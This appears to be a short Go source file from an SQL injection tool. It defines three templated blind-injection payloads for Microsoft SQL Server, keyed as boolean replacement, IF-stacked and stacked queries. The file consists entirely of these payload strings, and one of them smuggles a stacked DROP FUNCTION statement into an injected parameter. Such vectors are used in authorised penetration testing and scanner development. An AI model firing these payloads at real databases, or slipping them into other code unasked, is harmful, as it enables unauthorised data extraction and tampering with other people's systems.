package mssql

var B_Vectors = map[string]string {
	"bool_rep": "(SELECT (CASE WHEN (%s) THEN 1 ELSE 1*(SELECT 1 UNION ALL SELECT 3655) END))",
	"if_stacked": "%s;IF(%s) SELECT 2380 ELSE DROP FUNCTION nafo%s",
	"stacked": "%s;SELECT (CASE WHEN (%s) THEN 1 ELSE 1154*(SELECT 2996 UNION ALL SELECT 9923) END)%s",
}